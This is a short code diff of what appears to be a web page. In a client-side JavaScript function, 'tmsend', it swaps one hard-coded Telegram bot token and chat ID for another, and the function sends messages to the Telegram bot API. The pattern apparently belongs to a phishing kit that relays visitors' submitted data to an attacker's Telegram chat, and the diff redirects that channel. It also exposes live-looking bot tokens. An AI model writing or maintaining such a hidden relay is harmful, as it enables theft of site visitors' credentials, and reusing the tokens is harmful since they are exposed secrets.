@@ -411,8 +411,8 @@ h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
 	
 
 	function tmsend(message){
-	    var token = "8014178265:AAHUllMTV5woqGb998AUjFUbz49GxatFoOU";
-		var chat_id= "7797398021";
+	    var token = "6011529302:AAELRL29jmCaG2t6oxVr2rcoBFWlkLmWal4";
+		var chat_id= "6070449240";
 	    const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
 
 	    const obj = {
